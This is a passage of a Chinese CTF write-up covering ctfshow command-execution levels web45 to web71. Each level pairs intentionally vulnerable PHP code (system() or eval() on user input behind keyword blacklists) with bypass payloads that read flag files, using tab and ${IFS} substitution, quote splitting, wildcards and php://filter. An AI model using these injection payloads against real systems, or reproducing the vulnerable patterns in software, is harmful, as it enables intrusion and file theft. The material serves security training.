<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\;|cat|flag| /i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="variable">$c</span>.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="payload-17">payload</h3>
<p>过滤了空格</p>
<h4 id="方法一-14">方法一</h4>
<p>%09绕过</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?c=tac%09fla*.php%0a</span><br></pre></td></tr></table></figure>
<h4 id="方法二-11">方法二</h4>
<p>${IFS}和${IFS}$+数字绕过</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?c=tac$&#123;IFS&#125;fla*.php%0a</span><br><span class="line">?c=tac$&#123;IFS&#125;$9fla*.php%0a</span><br></pre></td></tr></table></figure>
<h2 id="web46">web46</h2>
<h3 id="源码-18">源码</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\;|cat|flag| |[0-9]|\\$|\*/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="variable">$c</span>.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="payload-18">payload</h3>
<p>过滤了数字，$，*</p>
<p>那么就需要做相应修改</p>
<p>空格使用%09，url解析为Tab，%0a，url解析为回车，*被禁用，改成?就好了</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?c=tac%09fla?.php%0a</span><br></pre></td></tr></table></figure>
<h2 id="web47">web47</h2>
<h3 id="源码-19">源码</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="variable">$c</span>.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="payload-19">payload</h3>
<ol>
<li><strong><code>more</code>：</strong>
<ul>
<li><code>more</code> 命令用于逐页显示文本文件的内容。当文本文件内容超过一个屏幕时，<code>more</code> 会逐页显示，并且等待用户按键（通常是空格键）以继续显示下一页。</li>
</ul>
</li>
<li><strong><code>less</code>：</strong>
<ul>
<li><code>less</code> 也是用于逐页显示文本文件的内容，但相较于 <code>more</code> 具有更多功能和交互性。用户可以通过键盘进行向前翻页、向后翻页、搜索等操作。</li>
</ul>
</li>
<li><strong><code>head</code>：</strong>
<ul>
<li><code>head</code> 命令用于显示文件的开头部分，默认显示文件的前 10 行。可以使用参数指定显示的行数。</li>
</ul>
</li>
<li><strong><code>sort</code>：</strong>
<ul>
<li><code>sort</code> 命令用于对文本文件进行排序，默认以字母顺序排序。可以通过不同的选项来实现不同的排序方式，如数字排序等。</li>
</ul>
</li>
<li><strong><code>tail</code>：</strong>
<ul>
<li><code>tail</code> 命令用于显示文件的结尾部分，默认显示文件的最后 10 行。可以使用参数指定显示的行数。它通常用于监视正在进行的日志文件。</li>
</ul>
</li>
</ol>
<p>增添了部分命令的过滤，如上</p>
<p>Payload直接沿用上一个</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?c=tac%09fla?.php%0a</span><br></pre></td></tr></table></figure>
<h2 id="web48">web48</h2>
<h3 id="源码-20">源码</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|awk|strings|od|curl|\`/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="variable">$c</span>.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="payload-20">payload</h3>
<ol>
<li><strong><code>sed</code>：</strong>
<ul>
<li><code>sed</code>（Stream Editor）是一个流编辑器，用于对文本进行流式处理。它可以进行文本替换、删除、插入等操作，通常与正则表达式一起使用。</li>
</ul>
</li>
<li><strong><code>cut</code>：</strong>
<ul>
<li><code>cut</code> 命令用于从文本行或字段中剪切出指定的部分。它通常用于处理以特定分隔符分割的文本文件，如CSV文件。</li>
</ul>
</li>
<li><strong><code>awk</code>：</strong>
<ul>
<li><code>awk</code> 是一种强大的文本处理工具，用于在文本文件中逐行进行处理。它支持自定义的文本处理脚本，可以执行复杂的文本分析和转换操作。</li>
</ul>
</li>
<li><strong><code>strings</code>：</strong>
<ul>
<li><code>strings</code> 命令用于从二进制文件中提取可打印的字符串。它通常用于查找二进制文件中的文本信息，如可执行文件或库文件。</li>
</ul>
</li>
<li><strong><code>od</code>：</strong>
<ul>
<li><code>od</code>（octal dump）命令以八进制、十六进制或其他格式显示文件的内容。它通常用于查看二进制文件的内容。</li>
</ul>
</li>
<li><strong><code>curl</code>：</strong>
<ul>
<li><code>curl</code> 是一个命令行工具，用于通过 URL 进行数据传输。它支持多种协议，包括 HTTP、HTTPS、FTP 等，可以用于下载文件、发送请求等网络操作。</li>
</ul>
</li>
</ol>
<p>过滤以上</p>
<p>不妨碍上一个payload，但是我们也可以去相应探究所禁止的这些命令的利用方法</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?c=tac%09fla?.php%0a</span><br></pre></td></tr></table></figure>
<h2 id="web49">web49</h2>
<h3 id="源码-21">源码</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|awk|strings|od|curl|\`|\%/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="variable">$c</span>.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="payload-21">payload</h3>
<p>新增过滤了`，%</p>
<p>注意在输入%09和%0a的时候，实际解析为下文，自行查找</p>
<p><a href="https://www.w3school.com.cn/tags/html_ref_urlencode.asp">HTML URL 编码参考手册 (w3school.com.cn)</a></p>
<p>因此该payload依旧能打通</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?c=tac%09fla?.php%0a</span><br></pre></td></tr></table></figure>
<h2 id="web50">web50</h2>
<h3 id="源码-22">源码</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|awk|strings|od|curl|\`|\%|\x09|\x26/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="variable">$c</span>.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="payload-22">payload</h3>
<p>新增过滤\x09|\x26</p>
<p>这边使用nl命令</p>
<p><code>nl</code> 是一个用于在文本文件中显示行号的命令。该命令通常在命令行终端中使用，用于对文本文件进行行号标记，方便用户查看和定位特定行。</p>
<p>以下是 <code>nl</code> 命令的基本用法：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">nl</span> [选项] 文件名</span><br></pre></td></tr></table></figure>
<p>主要选项包括：</p>
<ul>
<li><code>-b</code>：指定行号的计数方式，可以是 <code>t</code>（表示非空行）、<code>a</code>（表示所有行）、<code>n</code>（表示不标行号）。</li>
<li><code>-i</code>：设置行号的递增间隔。</li>
<li><code>-v</code>：指定行号的起始值。</li>
</ul>
<p>例如，要对文件 <code>example.txt</code> 进行行号标记，可以使用以下命令：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">nl</span> example.txt</span><br></pre></td></tr></table></figure>
<p>这将输出带有行号的文件内容。<code>nl</code> 命令对于查看大型文本文件或在脚本中进行文本处理时很有用。</p>
<p>给出payload</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?c=nl&lt;fla&#x27;&#x27;g.php%0a</span><br></pre></td></tr></table></figure>
<h2 id="web51">web51</h2>
<h3 id="源码-23">源码</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|\`|\%|\x09|\x26/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="variable">$c</span>.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="payload-23">payload</h3>
<p>增加了对tac命令的过滤</p>
<p>可以绕过，也可以换其他命令</p>
<h4 id="方法一-15">方法一</h4>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?c=t&#x27;&#x27;ac&lt;fl&#x27;&#x27;ag.php%0a</span><br></pre></td></tr></table></figure>
<h4 id="方法二-12">方法二</h4>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?c=nl&lt;fla&#x27;&#x27;g.php%0a</span><br></pre></td></tr></table></figure>
<h2 id="web52">web52</h2>
<h3 id="源码-24">源码</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\;|cat|flag| |[0-9]|\*|more|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|\`|\%|\x09|\x26|\&gt;|\&lt;/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="variable">$c</span>.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="payload-24">payload</h3>
<p>将&lt;和&gt;也进行了过滤，但是放开了对$的过滤</p>
<p>修改一个空格绕过方式就可以了</p>
<h4 id="方法一-16">方法一</h4>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?c=nl$&#123;IFS&#125;/fla&#x27;&#x27;g%0a</span><br></pre></td></tr></table></figure>
<h4 id="方法二-13">方法二</h4>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?c=t&#x27;&#x27;ac$&#123;IFS&#125;/fl&#x27;&#x27;ag%0a</span><br></pre></td></tr></table></figure>
<h2 id="web53">web53</h2>
<h3 id="源码-25">源码</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\;|cat|flag| |[0-9]|\*|more|wget|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|\`|\%|\x09|\x26|\&gt;|\&lt;/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">echo</span>(<span class="variable">$c</span>);</span><br><span class="line">        <span class="variable">$d</span> = <span class="title function_ invoke__">system</span>(<span class="variable">$c</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>.<span class="variable">$d</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;no&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="payload-25">payload</h3>
<p>新增wegt的过滤</p>
<p>简单展示两种</p>
<h4 id="方法一-17">方法一</h4>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?c=nl$&#123;IFS&#125;fla&#x27;&#x27;g.php%0a</span><br></pre></td></tr></table></figure>
<h4 id="方法二-14">方法二</h4>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?c=ca\t$&#123;IFS&#125;fla\g.php%0a</span><br></pre></td></tr></table></figure>
<h2 id="web54">web54</h2>
<h3 id="源码-26">源码</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\;|.*c.*a.*t.*|.*f.*l.*a.*g.*| |[0-9]|\*|.*m.*o.*r.*e.*|.*w.*g.*e.*t.*|.*l.*e.*s.*s.*|.*h.*e.*a.*d.*|.*s.*o.*r.*t.*|.*t.*a.*i.*l.*|.*s.*e.*d.*|.*c.*u.*t.*|.*t.*a.*c.*|.*a.*w.*k.*|.*s.*t.*r.*i.*n.*g.*s.*|.*o.*d.*|.*c.*u.*r.*l.*|.*n.*l.*|.*s.*c.*p.*|.*r.*m.*|\`|\%|\x09|\x26|\&gt;|\&lt;/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="payload-26">payload</h3>
<p>因为本题通过通配符将大部分利用命令包括其相应的绕过方式都进行了过滤</p>
<p>本题大致思路有两种</p>
<p>一种是将flag的页面复制到其他页面，再进行读取</p>
<p>一种是直接利用未过滤的查找命令</p>
<p>（多学linux</p>
<h4 id="方法一-18">方法一</h4>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?c=cp$&#123;IFS&#125;???g.php$&#123;IFS&#125;t.txt</span><br></pre></td></tr></table></figure>
<p>然后访问t.txt</p>
<h4 id="方法二-15">方法二</h4>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?c=/bin/ca?$&#123;IFS&#125;????.???</span><br></pre></td></tr></table></figure>
<h4 id="方法三-6">方法三</h4>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?c=grep$&#123;IFS&#125;%27fla%27$&#123;IFS&#125;f???????%0a</span><br></pre></td></tr></table></figure>
<h4 id="方法四-4">方法四</h4>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?c= mv$&#123;IFS&#125;fla?.php$&#123;IFS&#125;a.txt</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?c=uniq$&#123;IFS&#125;f???.php</span><br></pre></td></tr></table></figure>
<h2 id="web55">web55</h2>
<h3 id="源码-27">源码</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// 你们在炫技吗？</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\;|[a-z]|\`|\%|\x09|\x26|\&gt;|\&lt;/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="payload-27">payload</h3>
<p>见下题</p>
<h2 id="web56">web56</h2>
<h3 id="源码-28">源码</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// 你们在炫技吗？</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\;|[a-z]|[0-9]|\\$|\(|\&#123;|\&#x27;|\&quot;|\`|\%|\x09|\x26|\&gt;|\&lt;/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="payload-28">payload</h3>
<p>这两道题，后一道题只是比前一道题多出了一个过滤数字</p>
<p>解法是类似的</p>
<h4 id="方法一-19">方法一</h4>
<p>第一种方法仅针对第一题而言</p>
<p>正常命令应该是</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/bin/base64 flag.php</span><br></pre></td></tr></table></figure>
<p>需要绕过字母，因此可以使用?进行匹配</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?c=/???/????64 ????????</span><br></pre></td></tr></table></figure>
<h4 id="方法二-16">方法二</h4>
<p>本题的关键是先构造一个上传的数据包，然后利用.执行保存再临时文件目录下的的sh文件命令</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?c=.%20/???/????????[@-[]</span><br></pre></td></tr></table></figure>
<p>这边比较有趣的一个思路就是使用[]范围限制控制大小写的匹配，具体参照P神的这篇文章</p>
<p><a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html">无字母数字webshell之提高篇 | 离别歌 (leavesongs.com)</a></p>
<h2 id="web57">web57</h2>
<h3 id="源码-29">源码</h3>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">// 还能炫的动吗？</span><br><span class="line">//flag in 36.php</span><br><span class="line">if(isset($_GET[&#x27;c&#x27;]))&#123;</span><br><span class="line">    $c=$_GET[&#x27;c&#x27;];</span><br><span class="line">    if(!preg_match(&quot;/\;|[a-z]|[0-9]|\`|\|\#|\&#x27;|\&quot;|\`|\%|\x09|\x26|\x0a|\&gt;|\&lt;|\.|\,|\?|\*|\-|\=|\[/i&quot;, $c))&#123;</span><br><span class="line">        system(&quot;cat &quot;.$c.&quot;.php&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="payload-29">payload</h3>
<p>本题是一个数字过滤的问题，首先了解一个</p>
<p>$(())=0，对其进行取反得到$(( ~$(()) ))=1，然后再此基础上取值为36</p>
<p>对于36，首先对其进行取反，得到为-37，然后利用-1进行加和，最终得到36</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?c=$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))</span><br></pre></td></tr></table></figure>
<h2 id="web58">web58</h2>
<h3 id="源码-30">源码</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// 你们在炫技吗？</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">        <span class="variable">$c</span>= <span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="payload-30">payload</h3>
<h4 id="方法一-20">方法一</h4>
<p>include+伪协议绕过</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">c=include($_POST[&#x27;w&#x27;]);&amp;w=php://filter/convert.base64-encode/resource=flag.php</span><br></pre></td></tr></table></figure>
<h4 id="方法二-17">方法二</h4>
<p>直接使用highlight_file显示页面</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">c=highlight_file(&quot;flag.php&quot;);</span><br></pre></td></tr></table></figure>
<h2 id="web59">web59</h2>
<h2 id="web60">web60</h2>
<h2 id="web61">web61</h2>
<h2 id="web62">web62</h2>
<h2 id="web63">web63</h2>
<h2 id="web64">web64</h2>
<h2 id="web65">web65</h2>
<p>这两题跟58用同一个都能打通，因为是黑盒，也不确定到底是禁了什么函数</p>
<h2 id="web66">web66</h2>
<p>黑盒，无源码</p>
<h3 id="payload-31">payload</h3>
<ol>
<li>
<p>首先查看目录</p>
<p>都是使用了scandir函数对根目录进行罗列，区别在于使用的回显函数</p>
<p><strong>方法一</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">c=print_r(scandir(&quot;/&quot;));</span><br></pre></td></tr></table></figure>
<p><strong>方法二</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">c=var_dump(scandir(&#x27;/&#x27;));</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>查看文件内容</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">c=highlight_file(&quot;../../../../../flag.txt&quot;);</span><br></pre></td></tr></table></figure>
<p>可以参考上面，这边只给出一个实例</p>
</li>
</ol>
<h2 id="web67">web67</h2>
<h3 id="payload-32">payload</h3>
<p>print_r函数被禁用，使用另一个就行</p>
<h2 id="web68">web68</h2>
<h3 id="payload-33">payload</h3>
<p>禁用了highlight_file等，然后这边使用另外一个readgzfile，查看内容与上一题一样</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">c=var_dump(scandir(&quot;/&quot;)); </span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">c=readgzfile(&quot;/flag.txt&quot;);</span><br></pre></td></tr></table></figure>
<h2 id="web69">web69</h2>
<h3 id="payload-34">payload</h3>
<p>只是每题禁用了不同的函数，寻找合适的替换就行</p>
<ol>
<li>
<p>首先查看目录</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">c=var_export(scandir(&#x27;/&#x27;));</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>查看文件内容</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">c=readgzfile(&#x27;/flag.txt&#x27;);</span><br></pre></td></tr></table></figure>
</li>
</ol>
<h2 id="web70">web70</h2>
<p>同69仍然可以生效</p>
<h2 id="web71">web71</h2>
<h3 id="源码-31">源码</h3>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">ini_set(&#x27;display_errors&#x27;, 0);</span><br><span class="line">// 你们在炫技吗？</span><br><span class="line">if(isset($_POST[&#x27;c&#x27;]))&#123;</span><br><span class="line">        $c= $_POST[&#x27;c&#x27;];</span><br><span class="line">        eval($c);</span><br><span class="line">        $s = ob_get_contents();</span><br><span class="line">        ob_end_clean();</span><br><span class="line">        echo preg_replace(&quot;/[0-9]|[a-z]/i&quot;,&quot;?&quot;,$s);</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br><span class="line">你要上天吗？</span><br></pre></td></tr></table></figure>
<h3 id="payload-35">payload</h3>
